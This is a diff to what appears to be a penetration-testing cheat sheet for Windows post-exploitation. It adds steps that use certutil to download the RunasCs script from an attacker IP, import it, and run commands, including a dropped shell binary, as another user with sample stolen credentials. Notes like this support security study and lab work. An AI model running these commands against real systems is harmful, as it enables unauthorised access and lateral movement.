@@ -968,6 +968,17 @@ $credential = New-Object System.Management.Automation.PSCredential($username, $p
 # Run a command as the specified user
 Start-Process shell_1710.exe -Credential $credential -ArgumentList "-NoExit", "-Command", "Get-Process"
 
+
+4b. Alternatively, you can use runas script: https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1?source=post_page-----b95d3146cfe9--------------------------------
+
+certutil -urlcache -f http://192.168.45.157/Invoke-RunasCs.ps1 Invoke-RunasCs.ps1
+Import-Module .\Invoke-RunasCs.ps1
+
+example:
+Invoke-RunasCs -Username $username -Password $Password -Command "whoami"
+Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
+Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "C:\tmp\shell1710.exe"
+
 5. Get full domain Name from powershell:
 Use either one below:
 (Get-WmiObject Win32_ComputerSystem).Domain
